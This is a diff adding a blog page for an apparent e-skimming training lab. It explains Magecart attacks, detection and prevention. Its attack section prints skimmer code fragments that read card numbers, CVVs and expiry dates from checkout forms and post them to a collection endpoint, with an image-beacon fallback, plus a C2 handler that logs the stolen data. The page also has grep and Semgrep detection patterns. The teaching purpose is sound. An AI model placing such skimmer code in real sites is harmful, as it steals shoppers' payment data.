@@ -1,0 +1,1008 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Understanding Magecart: How E-Skimming Attacks Steal Payment Data - E-Skimming Labs</title>
+    <meta name="description"
+        content="Comprehensive guide to Magecart e-skimming attacks with detailed Lab 1 walkthrough. Learn attack techniques, detection methods, and defense strategies.">
+
+    <!-- SEO Meta Tags -->
+    <meta name="robots" content="index, follow">
+    <meta name="keywords"
+        content="magecart, e-skimming, javascript injection, payment fraud, cybersecurity, lab walkthrough, credit card skimming">
+    <link rel="canonical" href="https://labs.pcioasis.com/blog/understanding-magecart">
+
+    <!-- Open Graph -->
+    <meta property="og:title" content="Understanding Magecart: How E-Skimming Attacks Steal Payment Data">
+    <meta property="og:description"
+        content="Comprehensive guide to Magecart e-skimming attacks with detailed Lab 1 walkthrough">
+    <meta property="og:url" content="https://labs.pcioasis.com/blog/understanding-magecart">
+    <meta property="og:type" content="article">
+
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap');
+
+        :root {
+            --bg-primary: #0a0e27;
+            --bg-secondary: #121733;
+            --bg-tertiary: #1a1f3a;
+            --bg-card: #1e2440;
+            --bg-hover: #252b4a;
+            --bg-code: #161b30;
+
+            --text-primary: #ffffff;
+            --text-secondary: #b8c5db;
+            --text-muted: #8b9dc3;
+
+            --accent-red: #ff6b6b;
+            --accent-orange: #ff922b;
+            --accent-green: #51cf66;
+            --accent-blue: #748ffc;
+            --accent-purple: #b197fc;
+            --accent-pink: #e64980;
+            --accent-yellow: #ffd43b;
+
+            --border-color: #2a3f5f;
+            --shadow-sm: 0 2px 4px rgba(0, 0, 0, 0.2);
+            --shadow-md: 0 4px 12px rgba(0, 0, 0, 0.3);
+            --shadow-lg: 0 8px 24px rgba(0, 0, 0, 0.4);
+
+            --gradient-1: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            --gradient-2: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            --gradient-3: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        .container-narrow {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        /* Header */
+        .header {
+            background: var(--bg-secondary);
+            border-bottom: 1px solid var(--border-color);
+            padding: 20px 0;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .header-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--accent-blue);
+            text-decoration: none;
+        }
+
+        .nav-tabs {
+            display: flex;
+            gap: 20px;
+        }
+
+        .nav-tab {
+            padding: 10px 20px;
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            color: var(--text-secondary);
+            text-decoration: none;
+            transition: all 0.3s ease;
+            font-weight: 500;
+        }
+
+        .nav-tab:hover {
+            background: var(--bg-hover);
+            color: var(--text-primary);
+            transform: translateY(-2px);
+            box-shadow: var(--shadow-md);
+        }
+
+        .nav-tab.active {
+            background: var(--gradient-1);
+            color: var(--text-primary);
+            border-color: transparent;
+        }
+
+        /* Hero Section */
+        .hero {
+            padding: 60px 0;
+            text-align: center;
+            background: var(--gradient-1);
+            margin-bottom: 60px;
+        }
+
+        .breadcrumb {
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+
+        .breadcrumb a {
+            color: rgba(255, 255, 255, 0.8);
+            text-decoration: none;
+        }
+
+        .breadcrumb a:hover {
+            color: #fff;
+            text-decoration: underline;
+        }
+
+        .breadcrumb span {
+            color: rgba(255, 255, 255, 0.6);
+        }
+
+        .hero .post-meta {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-bottom: 20px;
+        }
+
+        .hero .post-tag {
+            padding: 6px 12px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            text-transform: uppercase;
+            color: #fff;
+        }
+
+        .hero .post-date {
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 14px;
+        }
+
+        .hero h1 {
+            font-size: 42px;
+            font-weight: 800;
+            margin-bottom: 20px;
+            background: linear-gradient(135deg, #fff 0%, #e0e0e0 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            max-width: 800px;
+            margin-left: auto;
+            margin-right: auto;
+            line-height: 1.2;
+        }
+
+        .hero p {
+            font-size: 18px;
+            color: rgba(255, 255, 255, 0.9);
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        /* Article Content */
+        .article-content {
+            padding: 60px 0;
+        }
+
+        .article-content h2 {
+            font-size: 32px;
+            font-weight: 700;
+            margin: 50px 0 20px;
+            color: var(--text-primary);
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .article-content h3 {
+            font-size: 24px;
+            font-weight: 600;
+            margin: 35px 0 15px;
+            color: var(--text-primary);
+        }
+
+        .article-content h4 {
+            font-size: 20px;
+            font-weight: 600;
+            margin: 25px 0 12px;
+            color: var(--accent-purple);
+        }
+
+        .article-content p {
+            margin-bottom: 20px;
+            color: var(--text-secondary);
+            font-size: 17px;
+            line-height: 1.8;
+        }
+
+        .article-content strong {
+            color: var(--text-primary);
+        }
+
+        .article-content a {
+            color: var(--accent-blue);
+            text-decoration: none;
+        }
+
+        .article-content a:hover {
+            text-decoration: underline;
+        }
+
+        .article-content ul,
+        .article-content ol {
+            margin-bottom: 20px;
+            padding-left: 24px;
+            color: var(--text-secondary);
+        }
+
+        .article-content li {
+            margin-bottom: 10px;
+            font-size: 17px;
+        }
+
+        .article-content code {
+            font-family: 'JetBrains Mono', monospace;
+            background: var(--bg-tertiary);
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+
+        /* Code Blocks */
+        pre {
+            background: var(--bg-code);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 24px;
+            overflow-x: auto;
+            margin: 30px 0;
+            position: relative;
+        }
+
+        pre::before {
+            content: attr(data-lang);
+            position: absolute;
+            top: 10px;
+            right: 15px;
+            font-size: 11px;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-family: 'Inter', sans-serif;
+        }
+
+        pre code {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 14px;
+            line-height: 1.7;
+            background: transparent;
+            padding: 0;
+        }
+
+        .code-line {
+            display: block;
+        }
+
+        .code-line.highlight {
+            background: rgba(255, 107, 107, 0.12);
+            border-left: 3px solid var(--accent-red);
+            margin: 0 -24px;
+            padding: 0 24px 0 21px;
+        }
+
+        .code-line.highlight-green {
+            background: rgba(81, 207, 102, 0.12);
+            border-left: 3px solid var(--accent-green);
+            margin: 0 -24px;
+            padding: 0 24px 0 21px;
+        }
+
+        /* Callout Boxes */
+        .callout {
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 24px;
+            margin: 30px 0;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .callout::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            bottom: 0;
+            width: 4px;
+        }
+
+        .callout-warning::before {
+            background: var(--accent-red);
+        }
+
+        .callout-info::before {
+            background: var(--accent-blue);
+        }
+
+        .callout-success::before {
+            background: var(--accent-green);
+        }
+
+        .callout-purple::before {
+            background: var(--accent-purple);
+        }
+
+        .callout-title {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .callout-warning .callout-title {
+            color: var(--accent-red);
+        }
+
+        .callout-info .callout-title {
+            color: var(--accent-blue);
+        }
+
+        .callout-success .callout-title {
+            color: var(--accent-green);
+        }
+
+        .callout-purple .callout-title {
+            color: var(--accent-purple);
+        }
+
+        .callout p,
+        .callout ul {
+            margin-bottom: 0;
+        }
+
+        /* Table of Contents */
+        .toc {
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 24px;
+            margin-bottom: 40px;
+        }
+
+        .toc h3 {
+            margin-top: 0;
+            margin-bottom: 15px;
+            color: var(--text-primary);
+        }
+
+        .toc ul {
+            list-style: none;
+            padding-left: 0;
+            margin-bottom: 0;
+        }
+
+        .toc li {
+            margin-bottom: 8px;
+        }
+
+        .toc a {
+            color: var(--text-secondary);
+            text-decoration: none;
+        }
+
+        .toc a:hover {
+            color: var(--accent-blue);
+        }
+
+        /* File Structure */
+        .file-structure {
+            background: var(--bg-code);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 24px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 14px;
+            line-height: 1.8;
+            margin: 30px 0;
+        }
+
+        .file-structure .folder {
+            color: var(--accent-blue);
+        }
+
+        .file-structure .file {
+            color: var(--text-secondary);
+        }
+
+        .file-structure .malicious {
+            color: var(--accent-red);
+        }
+
+        /* CTA Section */
+        .cta-section {
+            background: var(--bg-secondary);
+            border-radius: 20px;
+            padding: 50px;
+            text-align: center;
+            margin: 60px 0;
+        }
+
+        .cta-section h3 {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 15px;
+            color: var(--text-primary);
+        }
+
+        .cta-section p {
+            color: var(--text-secondary);
+            margin-bottom: 25px;
+            font-size: 17px;
+        }
+
+        .cta-buttons {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+
+        .cta-btn {
+            display: inline-block;
+            padding: 14px 28px;
+            border-radius: 8px;
+            text-decoration: none;
+            font-weight: 600;
+            transition: all 0.3s ease;
+        }
+
+        .cta-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: var(--shadow-md);
+        }
+
+        .cta-btn-primary {
+            background: var(--gradient-1);
+            color: var(--text-primary);
+        }
+
+        .cta-btn-secondary {
+            background: var(--bg-card);
+            color: var(--text-primary);
+            border: 1px solid var(--border-color);
+        }
+
+        /* Real-World Stats */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin: 30px 0;
+        }
+
+        .stat-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 24px;
+            text-align: center;
+        }
+
+        .stat-number {
+            font-size: 36px;
+            font-weight: 800;
+            color: var(--accent-red);
+            margin-bottom: 8px;
+        }
+
+        .stat-label {
+            color: var(--text-secondary);
+            font-size: 14px;
+        }
+
+        /* Footer */
+        .footer {
+            background: var(--bg-secondary);
+            border-top: 1px solid var(--border-color);
+            padding: 40px 0;
+            text-align: center;
+            color: var(--text-muted);
+        }
+
+        .footer a {
+            color: var(--accent-blue);
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .hero h1 {
+                font-size: 28px;
+            }
+
+            .nav-tabs {
+                flex-direction: column;
+                gap: 10px;
+            }
+
+            .hero .post-meta {
+                flex-direction: column;
+                gap: 10px;
+            }
+
+            .cta-buttons {
+                flex-direction: column;
+            }
+
+            .stats-grid {
+                grid-template-columns: 1fr 1fr;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <header class="header">
+        <div class="container">
+            <div class="header-content">
+                <a href="/" class="logo">E-Skimming Labs</a>
+                <nav class="nav-tabs">
+                    <a href="/" class="nav-tab">Home</a>
+                    <a href="/mitre-attack" class="nav-tab">MITRE ATT&CK</a>
+                    <a href="/threat-model" class="nav-tab">Threat Model</a>
+                    <a href="/blog" class="nav-tab active">Blog</a>
+                </nav>
+            </div>
+        </div>
+    </header>
+
+    <main>
+        <section class="hero">
+            <div class="container">
+                <nav class="breadcrumb">
+                    <a href="/">Home</a> / <a href="/blog">Blog</a> / <span>Understanding Magecart</span>
+                </nav>
+                <div class="post-meta">
+                    <span class="post-tag">Lab 1 Writeup</span>
+                    <span class="post-tag">E-Skimming</span>
+                    <span class="post-date">February 5, 2026</span>
+                </div>
+                <h1>Understanding Magecart: How E-Skimming Attacks Steal Payment Data</h1>
+                <p>A comprehensive deep-dive into Lab 1, exploring how basic Magecart attacks compromise e-commerce
+                    sites to steal credit card information.</p>
+            </div>
+        </section>
+
+        <article class="article-content">
+            <div class="container-narrow">
+                <!-- Table of Contents -->
+                <div class="toc">
+                    <h3>In This Article</h3>
+                    <ul>
+                        <li><a href="#what-is-magecart">What is Magecart?</a></li>
+                        <li><a href="#real-world-impact">Real-World Impact & Notable Breaches</a></li>
+                        <li><a href="#attack-anatomy">Anatomy of the Attack</a></li>
+                        <li><a href="#lab-walkthrough">Lab 1 Technical Walkthrough</a></li>
+                        <li><a href="#c2-server">The C2 (Command & Control) Server</a></li>
+                        <li><a href="#detection">Detection Methods</a></li>
+                        <li><a href="#prevention">Prevention Strategies</a></li>
+                        <li><a href="#try-it">Try It Yourself</a></li>
+                    </ul>
+                </div>
+
+                <div class="callout callout-warning">
+                    <div class="callout-title">Educational Purpose Only</div>
+                    <p>This article and Lab 1 are strictly for educational purposes. The code examples demonstrate
+                        attack techniques to help security professionals understand and defend against them.
+                        <strong>Never use these techniques on systems you don't own.</strong>
+                    </p>
+                </div>
+
+                <h2 id="what-is-magecart">What is Magecart?</h2>
+                <p>
+                    <strong>Magecart</strong> is not a single hacking group, but an umbrella term for multiple
+                    cybercriminal organizations that specialize in stealing payment card data from e-commerce websites.
+                    These attacks are also known as:
+                </p>
+                <ul>
+                    <li><strong>E-skimming</strong> - Digital version of physical card skimmers</li>
+                    <li><strong>Web skimming</strong> - Skimming data from web pages</li>
+                    <li><strong>Formjacking</strong> - Hijacking form submissions</li>
+                    <li><strong>Digital skimming</strong> - Generic term for online card theft</li>
+                </ul>
+                <p>
+                    The name originated from early attacks targeting <strong>Magento</strong>-based shopping carts, but
+                    the techniques have evolved to target any website that processes payment information—Shopify,
+                    WooCommerce, custom e-commerce platforms, and more.
+                </p>
+
+                <h2 id="real-world-impact">Real-World Impact & Notable Breaches</h2>
+
+                <p>Magecart attacks have caused massive financial and reputational damage worldwide. Lab 1 simulates
+                    techniques similar to these real-world breaches:</p>
+
+                <div class="stats-grid">
+                    <div class="stat-card">
+                        <div class="stat-number">380K</div>
+                        <div class="stat-label">British Airways customers affected (2018)</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-number">40K</div>
+                        <div class="stat-label">Ticketmaster victims (2018)</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-number">70K+</div>
+                        <div class="stat-label">Websites compromised since 2015</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-number">$20M</div>
+                        <div class="stat-label">British Airways GDPR fine</div>
+                    </div>
+                </div>
+
+                <p>Major Magecart groups documented by security researchers include:</p>
+                <ul>
+                    <li><strong>Magecart Group 4, 5, 6, 12</strong> - Various e-commerce compromises</li>
+                    <li><strong>Newegg breach (2018)</strong> - 1-month persistent attack on major electronics retailer
+                    </li>
+                    <li><strong>Macy's breach (2019)</strong> - Customer payment data stolen</li>
+                    <li><strong>Forbes Magazine breach (2019)</strong> - Subscription page compromised</li>
+                </ul>
+
+                <h2 id="attack-anatomy">Anatomy of the Attack</h2>
+                <p>Classic Magecart attacks follow a consistent pattern that Lab 1 demonstrates in a controlled
+                    environment:</p>
+
+                <h3>Step 1: Initial Compromise</h3>
+                <p>Attackers gain access to inject malicious JavaScript through:</p>
+                <ul>
+                    <li>Compromised admin credentials (weak passwords, phishing)</li>
+                    <li>Exploiting CMS vulnerabilities (Magento, WooCommerce plugins)</li>
+                    <li>Supply chain attacks (compromising third-party scripts)</li>
+                    <li>Server-side attacks (SQL injection, RCE)</li>
+                </ul>
+
+                <h3>Step 2: Code Injection</h3>
+                <p>The attack involves <strong>appending malicious code</strong> to legitimate JavaScript files. In Lab
+                    1, we demonstrate this in <code>checkout-compromised.js</code>:</p>
+
+                <pre data-lang="javascript"><code><span class="code-line">// ============================================================================</span>
+<span class="code-line">// LEGITIMATE CHECKOUT CODE (lines 1-239)</span>
+<span class="code-line">// ============================================================================</span>
+<span class="code-line">;(function () {</span>
+<span class="code-line">  'use strict'</span>
+<span class="code-line">  // Normal checkout validation, UI updates, etc.</span>
+<span class="code-line">})()</span>
+<span class="code-line"></span>
+<span class="code-line highlight">// ============================================================================</span>
+<span class="code-line highlight">// MALICIOUS CODE INJECTED BY ATTACKERS (lines 240+)</span>
+<span class="code-line highlight">// In real attacks: heavily obfuscated, minified, hidden</span>
+<span class="code-line highlight">// ============================================================================</span>
+<span class="code-line highlight">;(function () {</span>
+<span class="code-line highlight">  setTimeout(function () {</span>
+<span class="code-line highlight">    // Skimmer initialization with delay to avoid detection</span>
+<span class="code-line highlight">  }, 500)</span>
+<span class="code-line highlight">})()</span></code></pre>
+
+                <div class="callout callout-info">
+                    <div class="callout-title">Why Two IIFE Blocks?</div>
+                    <p>Using separate Immediately Invoked Function Expressions (IIFEs) ensures the malicious code runs
+                        independently without breaking the legitimate checkout functionality. Customers complete
+                        purchases normally while their data is silently stolen.</p>
+                </div>
+
+                <h3>Step 3: Form Interception</h3>
+                <p>The skimmer waits for payment form submission and captures all sensitive fields:</p>
+
+                <pre data-lang="javascript"><code><span class="code-line">form.addEventListener('submit', function (event) {</span>
+<span class="code-line highlight">  const cardData = extractCardData()</span>
+<span class="code-line"></span>
+<span class="code-line">  if (hasValidCardData(cardData)) {</span>
+<span class="code-line highlight">    setTimeout(() => exfiltrateData(cardData), CONFIG.delay)</span>
+<span class="code-line">  }</span>
+<span class="code-line"></span>
+<span class="code-line highlight-green">  // CRITICAL: Allow legitimate checkout to continue</span>
+<span class="code-line highlight-green">  // (No preventDefault() - victim doesn't notice anything wrong)</span>
+<span class="code-line">})</span></code></pre>
+
+                <h3>Step 4: Data Extraction</h3>
+                <p>The skimmer systematically queries for payment fields using multiple selector strategies:</p>
+
+                <pre data-lang="javascript"><code><span class="code-line">function extractCardData() {</span>
+<span class="code-line">  return {</span>
+<span class="code-line highlight">    cardNumber: getFieldValue(['#card-number', '[name="cardNumber"]']),</span>
+<span class="code-line highlight">    cvv: getFieldValue(['#cvv', '[name="cvv"]']),</span>
+<span class="code-line highlight">    expiry: getFieldValue(['#expiry', '[name="expiry"]']),</span>
+<span class="code-line">    cardholderName: getFieldValue(['#cardholder-name', '[name="cardholderName"]']),</span>
+<span class="code-line">    billingAddress: getFieldValue(['#billing-address', '[name="billingAddress"]']),</span>
+<span class="code-line">    city: getFieldValue(['#city', '[name="city"]']),</span>
+<span class="code-line">    zip: getFieldValue(['#zip', '[name="zip"]']),</span>
+<span class="code-line">    email: getFieldValue(['#email', '[name="email"]']),</span>
+<span class="code-line">    metadata: {</span>
+<span class="code-line">      url: window.location.href,</span>
+<span class="code-line">      timestamp: new Date().toISOString(),</span>
+<span class="code-line">      userAgent: navigator.userAgent</span>
+<span class="code-line">    }</span>
+<span class="code-line">  }</span>
+<span class="code-line">}</span></code></pre>
+
+                <h3>Step 5: Data Exfiltration</h3>
+                <p>Stolen data is sent to an attacker-controlled C2 (Command & Control) server with a fallback
+                    mechanism:</p>
+
+                <pre data-lang="javascript"><code><span class="code-line">function exfiltrateData(data) {</span>
+<span class="code-line highlight">  // Primary method: AJAX POST request</span>
+<span class="code-line highlight">  fetch(CONFIG.exfilUrl, {</span>
+<span class="code-line">    method: 'POST',</span>
+<span class="code-line">    headers: { 'Content-Type': 'application/json' },</span>
+<span class="code-line">    body: JSON.stringify(data),</span>
+<span class="code-line">    mode: 'cors',</span>
+<span class="code-line highlight">    credentials: 'omit'  // Avoid sending cookies</span>
+<span class="code-line">  })</span>
+<span class="code-line">  .catch(error => {</span>
+<span class="code-line highlight">    // Fallback: Image beacon if fetch fails</span>
+<span class="code-line">    const img = new Image()</span>
+<span class="code-line highlight">    img.src = CONFIG.exfilUrl + '?d=' + btoa(JSON.stringify(data))</span>
+<span class="code-line">  })</span>
+<span class="code-line">}</span></code></pre>
+
+                <h2 id="c2-server">The C2 (Command & Control) Server</h2>
+                <p>Lab 1 includes a simulated attacker C2 server that demonstrates how stolen data is collected. Real
+                    attackers would host this on:</p>
+                <ul>
+                    <li>Compromised legitimate servers (to avoid suspicion)</li>
+                    <li>Bulletproof hosting providers (resistant to takedowns)</li>
+                    <li>Domains mimicking legitimate services (e.g., google-analytics-cdn.com)</li>
+                </ul>
+
+                <p>The C2 server in Lab 1 receives and logs stolen card data:</p>
+
+                <pre data-lang="javascript"><code><span class="code-line">// Receives stolen data via POST</span>
+<span class="code-line">app.post('/collect', async (req, res) => {</span>
+<span class="code-line">  const stolenData = req.body</span>
+<span class="code-line">  </span>
+<span class="code-line highlight">  // Validate if card data is "sellable"</span>
+<span class="code-line highlight">  const validation = validateCardData(stolenData)</span>
+<span class="code-line">  </span>
+<span class="code-line">  // Log to file (attackers would use encrypted databases)</span>
+<span class="code-line">  await logStolenData(stolenData)</span>
+<span class="code-line">  </span>
+<span class="code-line highlight-green">  // Return success to avoid alerting the skimmer</span>
+<span class="code-line highlight-green">  res.status(200).json({ status: 'ok' })</span>
+<span class="code-line">})</span></code></pre>
+
+                <div class="callout callout-purple">
+                    <div class="callout-title">What Attackers Do With Stolen Data</div>
+                    <ul>
+                        <li><strong>Sell on dark web marketplaces</strong> - $5-30 per card</li>
+                        <li><strong>Use for fraudulent purchases</strong> - High-value goods</li>
+                        <li><strong>Aggregate with other data</strong> - Build complete identities</li>
+                        <li><strong>Forward to money mules</strong> - Cash out through intermediaries</li>
+                    </ul>
+                </div>
+
+                <h2 id="lab-walkthrough">Lab 1 Technical Walkthrough</h2>
+
+                <h3>Lab 1 File Structure</h3>
+                <div class="file-structure">
+                    <span class="folder">01-basic-magecart/</span><br>
+                    ├── <span class="folder">vulnerable-site/</span>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Target e-commerce website<br>
+                    │ ├── <span class="file">index.html</span>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Store homepage<br>
+                    │ ├── <span class="file">checkout.html</span>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Checkout page<br>
+                    │ └── <span class="folder">js/</span><br>
+                    │ &nbsp;&nbsp;&nbsp;&nbsp;├── <span class="file">checkout.js</span>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Original legitimate code<br>
+                    │ &nbsp;&nbsp;&nbsp;&nbsp;└── <span class="malicious">checkout-compromised.js</span> # Legitimate +
+                    skimmer<br>
+                    ├── <span class="folder">malicious-code/</span>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# C2 server infrastructure<br>
+                    │ └── <span class="folder">c2-server/</span><br>
+                    │ &nbsp;&nbsp;&nbsp;&nbsp;├── <span class="malicious">server.js</span>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Data collection server<br>
+                    │ &nbsp;&nbsp;&nbsp;&nbsp;└── <span class="file">dashboard.html</span> &nbsp;&nbsp;&nbsp;# Stolen
+                    data viewer<br>
+                    └── <span class="folder">test/</span>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#
+                    Playwright test suite
+                </div>
+
+                <h3>Key Detection Signatures</h3>
+                <p>Lab 1 teaches you to identify these critical indicators:</p>
+
+                <h4>1. Dual IIFE Pattern</h4>
+                <p>Two separate Immediately Invoked Function Expressions in the same file—especially with
+                    <code>setTimeout</code> wrapping the second block—is a strong indicator of injected code.
+                </p>
+
+                <h4>2. CONFIG Objects with External URLs</h4>
+                <pre data-lang="javascript"><code><span class="code-line highlight">const CONFIG = {</span>
+<span class="code-line highlight">  exfilUrl: '/lab1/c2/collect',  // External endpoint!</span>
+<span class="code-line">  delay: 100,</span>
+<span class="code-line">  debug: true</span>
+<span class="code-line">}</span></code></pre>
+
+                <h4>3. Form Event Listeners That Don't preventDefault()</h4>
+                <p>Legitimate form handlers usually prevent default submission. Skimmers explicitly allow it to avoid
+                    detection.</p>
+
+                <h4>4. Network Requests to Non-Payment Domains</h4>
+                <p>POST requests during checkout to domains other than your payment processor are highly suspicious.</p>
+
+                <h2 id="detection">Detection Methods</h2>
+
+                <h3>Browser DevTools Detection</h3>
+                <p>Open DevTools (F12) and check:</p>
+                <ol>
+                    <li><strong>Network Tab:</strong> Filter by "collect" or "beacon"—look for POST requests to
+                        unexpected domains</li>
+                    <li><strong>Sources Tab:</strong> Navigate to checkout*.js and search for <code>exfilUrl</code>,
+                        <code>CONFIG</code>, <code>extractCardData</code>
+                    </li>
+                    <li><strong>Console Tab:</strong> Enable "Preserve log" and look for <code>[SKIMMER]</code> log
+                        messages</li>
+                </ol>
+
+                <h3>Static Analysis (grep commands)</h3>
+                <pre data-lang="bash"><code><span class="code-line"># Search for exfiltration URLs</span>
+<span class="code-line highlight">grep -r "exfilUrl\|c2Server\|collectUrl" --include="*.js" .</span>
+<span class="code-line"></span>
+<span class="code-line"># Search for form event listeners</span>
+<span class="code-line highlight">grep -r "addEventListener.*submit" --include="*.js" .</span>
+<span class="code-line"></span>
+<span class="code-line"># Search for data extraction patterns</span>
+<span class="code-line highlight">grep -r "cardNumber\|cvv.*expiry" --include="*.js" .</span>
+<span class="code-line"></span>
+<span class="code-line"># Search for fetch/beacon patterns</span>
+<span class="code-line highlight">grep -r "fetch.*POST\|new Image.*src" --include="*.js" .</span></code></pre>
+
+                <h3>Semgrep Detection Rules</h3>
+                <pre data-lang="yaml"><code><span class="code-line">rules:</span>
+<span class="code-line">  - id: credit-card-exfiltration</span>
+<span class="code-line">    patterns:</span>
+<span class="code-line highlight">      - pattern: fetch($URL, { ... body: $DATA ... })</span>
+<span class="code-line">      - metavariable-regex:</span>
+<span class="code-line">          metavariable: $DATA</span>
+<span class="code-line highlight">          regex: '.*(card|cvv|expir).*'</span>
+<span class="code-line">    message: "Potential credit card data exfiltration"</span>
+<span class="code-line">    severity: ERROR</span></code></pre>
+
+                <h2 id="prevention">Prevention Strategies</h2>
+
+                <h3>Content Security Policy (CSP)</h3>
+                <p>CSP is one of the most effective defenses. Configure headers to restrict script sources and
+                    connection endpoints:</p>
+
+                <pre data-lang="http"><code><span class="code-line">Content-Security-Policy:</span>
+<span class="code-line highlight">  script-src 'self' https://trusted-cdn.com;</span>
+<span class="code-line highlight">  connect-src 'self' https://api.payment-provider.com;</span>
+<span class="code-line">  form-action 'self';</span>
+<span class="code-line">  frame-ancestors 'none';</span>
+<span class="code-line">  report-uri /csp-violation-report;</span></code></pre>
+
+                <h3>Subresource Integrity (SRI)</h3>
+                <p>Ensure loaded scripts haven't been tampered with:</p>
+                <pre data-lang="html"><code><span class="code-line">&lt;script src="checkout.js"</span>
+<span class="code-line highlight">        integrity="sha384-oqVuAfXRKap7fdgcCY5uyk..."</span>
+<span class="code-line">        crossorigin="anonymous"&gt;&lt;/script&gt;</span></code></pre>
+
+                <h3>Additional Defense Measures</h3>
+                <ul>
+                    <li><strong>File Integrity Monitoring (FIM)</strong> - Detect unauthorized changes to JavaScript
+                        files</li>
+                    <li><strong>Regular security audits</strong> - Review third-party scripts and dependencies</li>
+                    <li><strong>Multi-factor authentication</strong> - Protect admin accounts from compromise</li>
+                    <li><strong>Network monitoring</strong> - Alert on unexpected outbound connections during checkout
+                    </li>
+                    <li><strong>Use payment iframes</strong> - Isolate payment forms from your domain's JavaScript</li>
+                </ul>
+
+                <div class="callout callout-success">
+                    <div class="callout-title">Key Takeaways</div>
+                    <ul>
+                        <li>Magecart attacks inject JavaScript to silently steal payment data</li>
+                        <li>Skimmers allow legitimate checkout to continue, hiding the theft</li>
+                        <li>Third-party scripts are a major attack vector</li>
+                        <li>CSP policies can effectively block unauthorized network requests</li>
+                        <li>Regular script auditing and SRI hashes provide defense-in-depth</li>
+                        <li>Lab 1 provides hands-on training to recognize these patterns</li>
+                    </ul>
+                </div>
+
+                <h2 id="try-it">Try It Yourself</h2>
+                <p>Ready to see these techniques in action? Lab 1 provides a safe, controlled environment to:</p>
+                <ul>
+                    <li>Explore compromised JavaScript and compare with legitimate code</li>
+                    <li>Observe data exfiltration in browser DevTools</li>
+                    <li>View the attacker's C2 dashboard with captured data</li>
+                    <li>Practice detection using the methods described above</li>
+                    <li>Run automated tests to verify skimmer behavior</li>
+                </ul>
+
+                <!-- CTA -->
+                <div class="cta-section">
+                    <h3>Launch Lab 1: Basic Magecart Attack</h3>
+                    <p>Get hands-on experience detecting and analyzing Magecart skimmers in our interactive lab
+                        environment.</p>
+                    <div class="cta-buttons">
+                        <a href="/lab1" class="cta-btn cta-btn-primary">
+                            Start Lab 1 →
+                        </a>
+                        <a href="/lab-01-writeup" class="cta-btn cta-btn-secondary">
+                            Full Technical Writeup
+                        </a>
+                    </div>
+                </div>
+
+                <h3>Continue Learning</h3>
+                <ul>
